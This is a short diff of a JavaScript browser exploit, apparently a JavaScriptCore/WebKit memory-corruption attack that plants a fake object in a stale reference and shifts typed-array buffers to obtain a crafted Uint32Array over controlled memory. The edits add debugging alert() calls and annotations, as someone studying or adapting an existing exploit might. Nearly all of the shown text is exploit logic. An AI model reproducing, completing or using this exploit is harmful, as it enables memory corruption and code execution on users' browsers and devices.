@@ -220,9 +220,11 @@ function dgc() {
  					'c': smsh,		// void* m_vector
  					'd': u2d(0x100, 0)	// uint32_t m_length;
  				}
+				alert("Created fake obj in stale[0]");
 
 				// Why do this? VVV
  				stale[1] = stale[0]
+				alert("set stale[1] = stale[0]");
 				
 				// ORIGINAL COMMENT: misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
 				// MY COMMENT: Offset by 16 bytes to get past the JSCell inheirited fields.
@@ -235,6 +237,8 @@ function dgc() {
 				
 				//ORIGINAL: bufs[i][k] += 0x10; 
 				bufs[i][k] += 8; 
+				alert("Offset bufs[i][k] by 8");
+				
 				if (stale[0] instanceof Uint32Array){
 					alert("Got proper Uint32Array!");
 				} else if (stale[0] instanceof Float32ArrayType){
@@ -246,6 +250,7 @@ function dgc() {
 				} else {
 					alert("Couldn't find valid type");
 				}
+				
 				
 				
 				/*
